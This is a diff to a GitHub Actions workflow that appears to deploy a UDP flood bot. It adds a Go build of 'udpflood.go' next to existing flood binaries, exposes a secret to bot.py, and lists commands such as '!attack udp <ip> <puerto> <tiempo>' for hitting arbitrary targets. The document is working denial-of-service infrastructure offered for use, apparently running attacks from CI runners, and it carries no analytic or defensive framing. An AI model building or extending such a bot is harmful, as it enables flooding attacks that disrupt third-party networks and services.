@@ -1,4 +1,4 @@
-name: UDPHexBott Testtt
+name: UDPBot Best
 
 on:
   workflow_dispatch:
@@ -17,6 +17,11 @@ jobs:
         uses: actions/setup-python@v4
         with:
           python-version: '3.11'
+
+      - name: Set up Go
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
 
       - name: Install Python dependencies
         run: |
@@ -55,21 +60,32 @@ jobs:
             echo "✗ udppps.c no encontrado, omitiendo compilación de udppps"
           fi
 
+          # Verificar udpflood.go
+          if [ -f udpflood.go ]; then
+            echo "✓ Encontrado: udpflood.go (método Go)"
+            go build -o udpflood udpflood.go 2>/dev/null || echo "⚠ No se pudo compilar udpflood.go, pero funcionará con 'go run'"
+          else
+            echo "✗ udpflood.go no encontrado"
+          fi
+
           # Listar archivos compilados
           echo ""
-          echo "=== Archivos compilados disponibles ==="
-          for bin in udp udphex udppps; do
+          echo "=== Archivos disponibles ==="
+          for bin in udp udphex udppps udpflood; do
             if [ -f "$bin" ]; then
               echo "✓ $bin (ejecutable)"
             else
-              echo "✗ $bin (no compilado)"
+              if [ -f "$bin.c" ] || [ -f "$bin.go" ]; then
+                echo "✓ $bin (archivo fuente presente)"
+              else
+                echo "✗ $bin (no encontrado)"
+              fi
             fi
           done
           echo "====================================="
 
       - name: Run bot with all methods
         env:
-          # Exponemos el secret como la variable de entorno KEYS que lee bot.py
           KEYS: ${{ secrets.KEYS }}
         run: |
           echo "====================================="
@@ -78,6 +94,20 @@ jobs:
           echo "  !attack udp <ip> <puerto> <tiempo>"
           echo "  !attack udphex <ip> <puerto> <tiempo>"
           echo "  !attack udppps <ip> <puerto> <tiempo>"
+          echo "  !attack udpflood <ip> <puerto> <tiempo>"
           echo "  !methods - Muestra información de métodos"
           echo "====================================="
+          
+          # Probar que Go funciona
+          echo "Probando Go..."
+          go version
+          
+          # Probar que podemos ejecutar el script Go
+          if [ -f udpflood.go ]; then
+            echo "Probando compilación de udpflood.go..."
+            go run udpflood.go 2>&1 | head -5 || echo "Error al probar udpflood.go"
+          fi
+          
+          echo ""
+          echo "Iniciando bot..."
           python bot.py
